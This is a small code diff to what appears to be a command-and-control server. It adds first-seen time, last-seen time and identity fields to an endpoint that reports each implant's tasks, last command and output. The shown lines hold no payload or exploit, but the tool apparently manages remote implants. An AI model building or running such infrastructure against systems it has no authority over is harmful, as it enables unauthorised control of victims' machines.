@@ -363,7 +363,7 @@ def implants():
     # if implant=<implantSN> not provided return only essential data aobut all implants: ImplantDict
     if implantSN == None:
         return jsonify(ImplantDict)
-    # in other case return status about running/pending/completed tasks and input and output of a lastly completed task
+    # in other case return also: status about running/pending/completed tasks and input and output of a lastly completed task
     else:
         pendingTasksN = 0
         inprogressTasksN = 0
@@ -373,6 +373,10 @@ def implants():
         last_task_command = ""
         last_task_output = ""
         errTasksN = 0
+
+        firstSeenAt = ImplantDict[implantSN]['firstSeenAt']
+        lastSeenAt = ImplantDict[implantSN]['lastSeenAt']
+        implantIdentity = ImplantDict[implantSN]['implantIdentity']
 
         # list of TaskIDs assigned to 'implantSN' implant
         # these tasks could be currently in one of the following states:
@@ -412,6 +416,9 @@ def implants():
                 'last_taskID' : last_taskID,
                 'last_task_command' : last_task_command,
                 'last_task_output' : last_task_output,
+                'firstSeenAt' : firstSeenAt,
+                'lastSeenAt' : lastSeenAt,
+                'implantIdentity' : implantIdentity,
         }
         return jsonify(resp)
 
